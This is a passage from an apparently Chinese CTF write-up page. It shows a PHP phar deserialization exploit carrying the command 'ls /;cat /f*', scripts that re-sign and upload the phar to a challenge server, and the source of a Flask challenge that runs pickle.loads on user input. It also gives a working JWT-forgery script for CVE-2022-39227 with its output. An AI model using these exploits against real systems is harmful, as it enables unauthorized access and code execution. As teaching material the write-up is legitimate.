data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">story</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$eating</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls /;cat /f*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$God</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'true'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">story</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 下面这部分就没改</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 stub</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将自定义的 meta-data 存入 manifest</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 添加要压缩的文件</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 签名自动计算</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>由于需要绕过 wakeup 函数，所以需要修改文件内容把 O:5:&quot;story&quot;:4 修改为 O:5:&quot;story&quot;:5，可以使用 16 进制编辑器进行修改，这里我使用的是 winhex：</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/26.png\" alt=\"26\" /></p>\n<p>修改完之后，因为 phar 的最后有一段 signature，是 phar 的签名，放在文件末尾，要注意因为我们修改了文件的内容，之前的签名就会无效，所以需要更换一个新的签名，生成新签名的脚本如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'phar.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型和 GBMB 标识</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>newf <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> sha1<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> h <span class=\"token comment\"># 数据 + 签名 + (类型 + GBMB)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'newtest.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入新文件</span></pre></td></tr></table></figure><p>最后就是将文件内容上传，由于有些字符直接复制会出现乱码，所以可以写一个脚本来将内容转换为 16 进制上传：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'flag\\&#123;.+?\\&#125;'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://b6ae3f8b-667d-4ea2-9d9f-b9223622791d.node4.buuoj.cn:81/pairing.php\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>params <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'pear'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1.phar'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">'apple'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'phar://1.phar'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'newtest.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> fi<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    f <span class=\"token operator\">=</span> fi<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    ff <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ff<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    fin <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>ff<span class=\"token punctuation\">,</span> params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    matches <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> fin<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> matches<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"yes-pickle\"><a class=\"anchor\" href=\"#yes-pickle\">#</a> Ye's Pickle</h3>\n<p>题目附件：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#app.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> jwcrypto<span class=\"token punctuation\">.</span>jwk <span class=\"token keyword\">as</span> jwk</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> pickle</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">from</span> python_jwt <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_string</span><span class=\"token punctuation\">(</span>length<span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    characters <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits  <span class=\"token comment\"># 包含字母和数字</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    random_string <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>characters<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> random_string</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> generate_random_string<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>key <span class=\"token operator\">=</span> jwk<span class=\"token punctuation\">.</span>JWK<span class=\"token punctuation\">.</span>generate<span class=\"token punctuation\">(</span>kty<span class=\"token operator\">=</span><span class=\"token string\">'RSA'</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    payload<span class=\"token operator\">=</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        token<span class=\"token operator\">=</span>verify_jwt<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'PS256'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        session<span class=\"token punctuation\">[</span><span class=\"token string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>token<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'role'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        session<span class=\"token punctuation\">[</span><span class=\"token string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"guest\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        user<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"boogipop\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"role\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"guest\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        jwt <span class=\"token operator\">=</span> generate_jwt<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> <span class=\"token string\">'PS256'</span><span class=\"token punctuation\">,</span> timedelta<span class=\"token punctuation\">(</span>minutes<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">,</span>token<span class=\"token operator\">=</span>jwt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/pickle\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">unser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">\"role\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        pickle<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"pickle\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">5000</span><span class=\"token punctuation\">,</span> debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#dockerfile</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> python:3.8.16-slim-buster</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">ENV</span> FLAG=flag&#123;not_here&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">COPY</span> src/ /app</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> mv /app/start.sh /start.sh &amp;&amp; chmod +x /start.sh</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> pip install -r /app/requirements.txt</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"/start.sh\"</span>]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token instruction\"><span class=\"token keyword\">EXPOSE</span> 5000</span></pre></td></tr></table></figure><p>这道题涉及到 pickle 反序列化和 python_jwt 的 CVE-2022-39227</p>\n<p>具体可以参考这三篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzA5MDM0Ni9hcnRpY2xlL2RldGFpbHMvMTM0Mjc3NDM4\">记 CVE-2022-39227-Python-JWT 漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI1MjE4OS5odG1s\">Python Pickle 反序列化漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMjc3NDk1\">python pickle 反序列化 R 指令禁用绕过</span></p>\n<p>所以这道题首先伪造身份：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> json <span class=\"token keyword\">import</span> loads<span class=\"token punctuation\">,</span> dumps  <span class=\"token comment\"># 导入 JSON 模块中的 loads 和 dumps 函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> jwcrypto<span class=\"token punctuation\">.</span>common <span class=\"token keyword\">import</span> base64url_encode<span class=\"token punctuation\">,</span> base64url_decode  <span class=\"token comment\"># 从 jwcrypto 库的 common 模块导入 base64url_encode 和 base64url_decode 函数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">[</span>header<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> topic<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 使用点号分割传入的字符串，得到 JWT 的头部、负载和签名部分</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    parsed_payload <span class=\"token operator\">=</span> loads<span class=\"token punctuation\">(</span>base64url_decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 对负载部分进行 base64 解码，然后将其解析为 JSON 格式的数据</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打印解析后的负载内容</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">\"role\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"admin\"</span>  <span class=\"token comment\"># 修改负载中的 \"role\" 字段为 \"admin\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将修改后的负载转换为 JSON 格式并打印出来，使用逗号和冒号作为分隔符</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    fake_payload <span class=\"token operator\">=</span> base64url_encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将修改后的负载转换为 JSON 格式，然后进行 base64 编码，构造一个伪造的负载</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fake_payload<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 打印伪造的负载</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'&#123;\" '</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> fake_payload <span class=\"token operator\">+</span> <span class=\"token string\">'.\":\"\",\"protected\":\"'</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'\", \"payload\":\"'</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> <span class=\"token string\">'\",\"signature\":\"'</span> <span class=\"token operator\">+</span> signature <span class=\"token operator\">+</span> <span class=\"token string\">'\"&#125; '</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 调用函数，并将一个具有点分隔的 JWT 字符串作为参数传递</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>topic<span class=\"token punctuation\">(</span><span class=\"token string\">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDM1OTg3NjMsImlhdCI6MTcwMzU5NTE2MywianRpIjoiM29tenpJNG9HZkdkUjgyVGp3YnNhUSIsIm5iZiI6MTcwMzU5NTE2Mywicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.Jwatn6euVcJmNa3iu4S1oeds4aEZ163Nur7u2M9NioMDnXmrsS2AaxyDDmkTn0VDAMLPx5Gg8Z_IHBKIF-A6Y0KoYoXmePyjxPdE_w9NZ5TN_T2fO4DwBrkEymKPPGHU-3SHFvucjcopEBr2JkSjBpuCUJ1AR-lOwmKX9G_JuQsObAfY9cIHV_L6hrlr8XVNLCbbnhf6HHGg5i2IWM3N_CQtrceAjQ0geqpt8jYfO8pWpv2bPorPpxGQzUdUn-DOQLRL6DDMh4GfOPOoYRMQwH5vbS70_ODMl9nQV9hWYy3KiP-KkjS26LXbp0tiqLP7rxcse9twsa6SGou3hSBHeg'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行后得到结果：</p>\n<blockquote eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDM1OTg3NjMsImlhdCI6MTcwMzU5NTE2MywianRpIjoiM29tenpJNG9HZkdkUjgyVGp3YnNhUSIsIm5iZiI6MTcwMzU5NTE2Mywicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.:,protected:eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9,payload:eyJleHAiOjE3MDM1OTg3NjMsImlhdCI6MTcwMzU5NTE2MywianRpIjoiM29tenpJNG9HZkdkUjgyVGp3YnNhUSIsIm5iZiI6MTcwMzU5NTE2Mywicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9,signature:Jwatn6euVcJmNa3iu4S1oeds4aEZ163Nur7u2M9NioMDnXmrsS2AaxyDDmkTn0VDAMLPx5Gg8Z_IHBKIF-A6Y0KoYoXmePyjxPdE_w9NZ5TN_T2fO4DwBrkEymKPPGHU-3SHFvucjcopEBr2JkSjBpuCUJ1AR-lOwmKX9G_JuQsObAfY9cIHV_L6hrlr8XVNLCbbnhf6HHGg5i2IWM3N_CQtrceAjQ0geqpt8jYfO8pWpv2bPorPpxGQzUdUn-DOQLRL6DDMh4GfOPOoYRMQwH5vbS70_ODMl9nQV9hWYy3KiP-KkjS26LXbp0tiqLP7rxcse9twsa6SGou3hSBHeg=\"\">\n<p>{'exp': 1703598763, 'iat': 1703595163, 'jti': '3omzzI4oGfGdR82TjwbsaQ', 'nbf': 1703595163, 'role': 'guest', 'username': 'boogipop'}<br />\n{&quot;exp&quot;:1703598763,&quot;iat&quot;:1703595163,&quot;jti&quot;:&quot;3omzzI4oGfGdR82TjwbsaQ&quot;,&quot;nbf&quot;:1703595163,&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;boogipop&quot;}<br 